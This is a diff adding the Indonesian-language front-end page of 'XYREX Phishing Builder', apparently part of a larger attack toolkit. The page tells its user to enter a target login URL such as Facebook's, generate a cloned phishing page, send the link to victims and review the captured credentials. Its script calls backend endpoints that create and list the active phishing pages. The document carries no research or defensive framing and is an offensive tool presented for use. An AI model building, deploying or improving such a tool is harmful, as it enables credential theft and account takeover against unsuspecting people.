@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XYREX - Phishing Builder</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+  body { background: linear-gradient(180deg, #c8d6ee 0%, #dbe4f5 100%); min-height: 100vh; padding-bottom: 30px; }
+  .topbar { background: #fff; border-bottom: 3px solid #0a0a0a; padding: 12px 16px; display: flex; align-items: center; gap: 12px; position: sticky; top: 0; z-index: 100; }
+  .back-btn { width: 44px; height: 44px; border: 3px solid #0a0a0a; border-radius: 12px; background: #fff; display: flex; align-items: center; justify-content: center; box-shadow: 3px 3px 0 #0a0a0a; text-decoration: none; color: #0a1a3a; }
+  .topbar .brand { font-size: 20px; font-weight: 800; color: #0a1a3a; }
+  .topbar .user-mini { margin-left: auto; background: #f5f8ff; border: 2px solid #0a0a0a; border-radius: 10px; padding: 6px 10px; font-size: 11px; font-weight: 700; color: #0a1a3a; }
+  .title-wrap { padding: 20px 22px 10px 22px; }
+  .title { font-size: 28px; font-weight: 800; color: #0a1a3a; }
+  .title span { color: #b00020; }
+  .subtitle { color: #4a5a7a; font-size: 13px; margin-top: 4px; }
+  .card { background: #fff; border: 3px solid #0a0a0a; border-radius: 18px; margin: 16px 22px; padding: 18px; box-shadow: 4px 4px 0 #0a0a0a; }
+  label { display: block; font-weight: 700; color: #0a1a3a; margin-bottom: 8px; font-size: 13px; }
+  input { width: 100%; padding: 14px; border: 3px solid #0a0a0a; border-radius: 12px; font-size: 14px; margin-bottom: 12px; background: #f5f8ff; }
+  input:focus { outline: none; border-color: #b00020; }
+  .btn { display: block; width: 100%; padding: 14px; border: 3px solid #0a0a0a; border-radius: 12px; font-size: 15px; font-weight: 800; cursor: pointer; box-shadow: 3px 3px 0 #0a0a0a; background: #b00020; color: #fff; margin-bottom: 10px; }
+  .btn:active { transform: translate(2px, 2px); box-shadow: 1px 1px 0 #0a0a0a; }
+  .btn-secondary { background: #1a5fd6; }
+  .btn-success { background: #25d366; }
+  .link-box { background: #d4ffd8; border: 3px solid #0a7a2a; border-radius: 12px; padding: 12px; font-size: 13px; color: #0a7a2a; word-break: break-all; display: none; margin-top: 12px; }
+  .link-box.show { display: block; }
+  .link-box .lbl { font-weight: 800; font-size: 11px; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 1px; }
+  .link-box .url { font-family: monospace; font-size: 12px; background: #fff; padding: 8px; border-radius: 8px; border: 2px solid #0a0a0a; margin-bottom: 8px; }
+  .link-box .btn { margin-bottom: 0; }
+  .info-tip { background: #fff3cd; border: 2px solid #856404; border-radius: 10px; padding: 12px; font-size: 12px; color: #856404; margin-bottom: 12px; line-height: 1.5; }
+  .list-item { background: #f5f8ff; border: 2px solid #0a0a0a; border-radius: 10px; padding: 10px; margin-bottom: 8px; font-size: 12px; display: flex; justify-content: space-between; align-items: center; gap: 10px; word-break: break-all; }
+  .list-item a { color: #1a5fd6; text-decoration: none; font-weight: 700; font-size: 11px; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <a class="back-btn" href="/tools.html"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg></a>
+  <div class="brand">Phishing Builder</div>
+  <div class="user-mini" id="userMini">-</div>
+</div>
+
+<div class="title-wrap">
+  <div class="title">Phishing <span>Builder</span></div>
+  <div class="subtitle">Kloning halaman login target, tangkap kredensial</div>
+</div>
+
+<div class="card">
+  <div class="info-tip">
+    <b>Cara pakai:</b><br>
+    1. Masukkan URL halaman login target (misal <code>https://facebook.com/login</code>)<br>
+    2. Klik Buat Phishing Page<br>
+    3. Copy link hasil, kirim ke korban<br>
+    4. Cek data masuk di <a href="/phishing-data.html" style="color:#b00020;font-weight:800;">Cek Data</a>
+  </div>
+  <label>URL Halaman Target</label>
+  <input type="text" id="targetUrl" placeholder="https://facebook.com/login">
+  <button class="btn" onclick="createPhish()" id="createBtn">Buat Phishing Page</button>
+
+  <div id="resultBox" class="link-box">
+    <div class="lbl">Link Phishing:</div>
+    <div class="url" id="resultUrl">-</div>
+    <button class="btn btn-success" onclick="copyLink()">Copy Link</button>
+  </div>
+</div>
+
+<div class="card">
+  <div style="font-size:14px; font-weight:800; color:#0a1a3a; margin-bottom:10px;">Phishing Page Aktif</div>
+  <button class="btn btn-secondary" onclick="loadList()" style="margin-bottom:12px;">Refresh List</button>
+  <div id="listContainer">-</div>
+</div>
+
+<script src="/tools-toast.js"></script>
+<script>
+const token = localStorage.getItem('xyrex_token');
+const user = localStorage.getItem('xyrex_user');
+if (!token) window.location.href = '/login.html';
+document.getElementById('userMini').textContent = (user || '-').toUpperCase();
+
+async function createPhish() {
+  const url = document.getElementById('targetUrl').value.trim();
+  if (!url) { window.xyrexToast('Masukkan URL dulu', 'error'); return; }
+  if (!url.startsWith('http')) { window.xyrexToast('URL harus http:// atau https://', 'error'); return; }
+
+  const btn = document.getElementById('createBtn');
+  btn.textContent = 'Memproses...';
+  btn.disabled = true;
+
+  try {
+    const r = await fetch('/api/phishing/create', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'x-auth-token': token },
+      body: JSON.stringify({ url: url })
+    });
+    const j = await r.json();
+    if (!j.ok) {
+      window.xyrexToast('Gagal: ' + (j.msg || 'unknown'), 'error');
+      btn.textContent = 'Buat Phishing Page';
+      btn.disabled = false;
+      return;
+    }
+    const fullUrl = window.location.origin + j.url;
+    document.getElementById('resultUrl').textContent = fullUrl;
+    document.getElementById('resultBox').classList.add('show');
+    window.xyrexToast('Phishing page berhasil dibuat!', 'success');
+    loadList();
+    btn.textContent = 'Buat Phishing Page';
+    btn.disabled = false;
+  } catch (e) {
+    window.xyrexToast('Error: ' + e.message, 'error');
+    btn.textContent = 'Buat Phishing Page';
+    btn.disabled = false;
+  }
+}
+
+function copyLink() {
+  const url = document.getElementById('resultUrl').textContent;
+  if (!url) return;
+  navigator.clipboard.writeText(url).then(() => {
+    window.xyrexToast('Link di-copy!', 'success');
+  }).catch(() => {
+    // Fallback
+    const ta = document.createElement('textarea');
+    ta.value = url;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    window.xyrexToast('Link di-copy!', 'success');
+  });
+}
+
+async function loadList() {
+  try {
+    const r = await fetch('/api/phishing/list', { headers: { 'x-auth-token': token } });
+    const j = await r.json();
+    const container = document.getElementById('listContainer');
+    if (!j.ok || !j.items || j.items.length === 0) {
+      container.innerHTML = '<div style="text-align:center; color:#7a8aaa; padding:12px; font-size:12px;">Belum ada phishing page</div>';
+      return;
+    }
+    container.innerHTML = '';
+    j.items.forEach(item => {
+      const el = document.createElement('div');
+      el.className = 'list-item';
+      const fullUrl = window.location.origin + item.url;
+      el.innerHTML = '<div style="flex:1;"><b>' + item.slug + '</b><br><a href="' + item.url + '" target="_blank">' + fullUrl + '</a></div>';
+      container.appendChild(el);
+    });
+  } catch (e) {}
+}
+
+window.addEventListener('load', () => setTimeout(loadList, 300));
+</script>
+
+</body>
+</html>
